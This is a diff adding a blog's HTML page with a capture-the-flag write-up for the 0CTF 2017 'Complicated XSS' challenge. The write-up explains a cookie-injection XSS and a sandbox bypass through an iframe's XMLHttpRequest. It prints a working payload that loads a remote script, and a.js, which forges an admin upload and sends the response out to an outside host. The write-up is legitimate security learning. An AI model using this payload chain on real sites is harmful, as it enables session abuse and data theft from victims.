@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>0CTF 2017 - Complicated XSS | Born to Learn</title>
+<link rel="stylesheet" href="https://jiulongw.github.io/css/style.css">
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.6.0/styles/github.min.css">
+
+
+<section class="section">
+  <div class="container">
+    <nav class="nav">
+      <div class="nav-left">
+        <a class="nav-item" href="https://jiulongw.github.io"><h1 class="title is-4">Born to Learn</h1></a>
+      </div>
+      <div class="nav-right">
+        <nav class="nav-item level is-mobile">
+          
+          <a class="level-item" href="https://github.com/jiulongw">
+            <span class="icon">
+              <i class="fa fa-github"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://twitter.com/jiulongw">
+            <span class="icon">
+              <i class="fa fa-twitter"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="/index.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+          </a>
+          
+        </nav>
+      </div>
+    </nav>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <div class="subtitle is-6 is-pulled-right">
+      
+      
+<a class="subtitle is-6" href="/tags/ctf">#CTF</a>
+
+
+
+| <a class="subtitle is-6" href="/tags/web">#Web</a>
+
+| <a class="subtitle is-6" href="/tags/xss">#XSS</a>
+
+
+      
+    </div>
+    <h2 class="subtitle is-6">March 20, 2017</h2>
+    <h1 class="title">0CTF 2017 - Complicated XSS</h1>
+    <div class="content">
+      <p>Cookies Monster&hellip;</p>
+
+<p></p>
+
+<h1 id="problem">Problem</h1>
+
+<blockquote>
+<p>Does this look familiar?<br />
+<a href="http://government.vip/">http://government.vip/</a>
+<hr />
+XSS Book</p>
+
+<p>The flag is in <a href="http://admin.government.vip:8000">http://admin.government.vip:8000</a><br />
+Bruteforce and scanning are not needed!<br />
+Admin will be hit by your payload</p>
+</blockquote>
+
+<h1 id="solution">Solution</h1>
+
+<p>Login to admin page with pre-populated test account, we can see there are two cookies: <code>username</code> and <code>session</code>, and the
+page says &ldquo;only admin can upload shell&rdquo;.  Seems like we need to XSS admin to upload something.  The <code>session</code> cookie is
+an HTTP cookie that cannot be accessed by script.  The <code>username</code> cookie however, is an XSS point.  Server reads <code>username</code>
+cookie content and displayed it as raw HTML.</p>
+
+<p>Now comes the tricky part: in the document header of admin page, some core component is stripped out.  Making AJAX call
+will fail since there&rsquo;s no <code>XMLHttpRequest</code>.  I also tried <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch API</a> which works locally but server&rsquo;s browser
+doesn&rsquo;t support it.</p>
+
+<pre><code class="language-html">&lt;script&gt;
+//sandbox
+delete window.Function;
+delete window.eval;
+delete window.alert;
+delete window.XMLHttpRequest;
+delete window.Proxy;
+delete window.Image;
+delete window.postMessage;
+&lt;/script&gt;
+</code></pre>
+
+<p>Poking around and I found out that the embedded <code>iframe</code> element still have <code>XMLHttpRequest</code>.</p>
+
+<p>Another trick that blocked me for quite a while is that the admin page only renders upload form if <code>username</code> cookie is
+&ldquo;admin&rdquo;.  So we need to reset cookie and fetch admin page again to see what parameters are needed for upload.
+Otherwise, it keeps hitting <code>400: bad request</code>.</p>
+
+<pre><code class="language-html">&lt;h1&gt;Hello admin&lt;/h1&gt;
+
+&lt;p&gt;Upload your shell&lt;/p&gt;
+&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;p&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;/input&gt;&lt;/p&gt;
+&lt;p&gt;&lt;input type=&quot;submit&quot; value=&quot;upload&quot;&gt;
+&lt;/form&gt;
+</code></pre>
+
+<p>Here&rsquo;s the XSS payload.</p>
+
+<pre><code class="language-javascript">document.cookie=&quot;username=&lt;iframe&gt;&lt;/iframe&gt;&lt;script src='http://.../a.js'&gt;&lt;/script&gt;;path=/;domain=.government.vip&quot;;
+window.location=&quot;http://admin.government.vip:8000&quot;;
+</code></pre>
+
+<p>a.js</p>
+
+<pre><code class="language-javascript">document.cookie=&quot;username=admin&quot;;
+
+var xhr = new frames[0].XMLHttpRequest;
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4) {
+    var result = xhr.responseText;
+    result += &quot;,&quot;;
+    result += xhr.status;
+    result += &quot;,&quot;;
+    result += xhr.getAllResponseHeaders();
+    window.location=&quot;http://.../?a=&quot; + btoa(result);
+  }
+}
+
+xhr.open('POST', '/upload', true);
+
+var fblob = new Blob([&quot;any content here&quot;]);
+var formData = new FormData();
+formData.append(&quot;file&quot;, fblob);
+
+xhr.send(formData);
+</code></pre>
+
+<p>Decoded response:</p>
+
+<pre><code>flag{xss_is_fun_2333333},200,Server: TornadoServer/4.4.2
+Content-Length: 24
+Content-Type: text/html; charset=utf-8
+</code></pre>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <aside><div id="disqus_thread"></div></aside>
+    <script type="text/javascript">
+      var disqus_shortname = 'jiulongw';
+      (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+
+
+<section class="section">
+  <div class="container has-text-centered">
+    <p>&copy; <a href="https://jiulongw.github.io">jiulongw</a> 2016</p>
+  </div>
+</section>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.6.0/highlight.min.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.6.0/languages/ruby.min.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.6.0/languages/bash.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-86115491-1', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+
